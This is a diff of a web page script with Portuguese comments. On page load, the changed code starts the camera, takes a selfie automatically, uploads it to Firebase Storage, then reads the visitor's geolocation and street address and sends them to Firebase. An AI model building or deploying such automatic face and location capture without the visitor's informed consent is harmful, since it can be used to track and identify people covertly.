@@ -62,7 +62,7 @@
         .then(snapshot => snapshot.ref.getDownloadURL())
         .then(url => {
           alert('Selfie salva no Firebase Storage!');
-          sendDataToFirebase({ ...addressDetails, selfieUrl: url });
+          getLocation(); // Após salvar a selfie, coleta localização e endereço
         })
         .catch(error => {
           console.error('Erro ao salvar a selfie:', error);
@@ -109,7 +109,7 @@
               address: data.results[0].formatted
             };
             alert(`Endereço completo: ${addressDetails.address}`);
-            captureSelfie(); // Captura selfie automaticamente após o endereço ser obtido
+            sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
           } else {
             alert('Endereço não encontrado.');
           }
@@ -141,11 +141,8 @@
           .then(stream => {
             video.srcObject = stream;
             video.onloadedmetadata = () => {
-              alert('Câmera pronta.');
-              // Aguarda o endereço e então captura a selfie
-              if (addressDetails) {
-                captureSelfie();
-              }
+              alert('Câmera pronta. Capturando selfie...');
+              captureSelfie(); // Captura a selfie automaticamente
             };
           })
           .catch(error => {
@@ -170,8 +167,7 @@
 
     // Iniciar coleta de dados
     window.onload = () => {
-      getLocation(); // Inicia geolocalização
-      startCamera(); // Inicia a câmera
+      startCamera(); // Inicia a câmera primeiro
     };
   </script>
 </body>
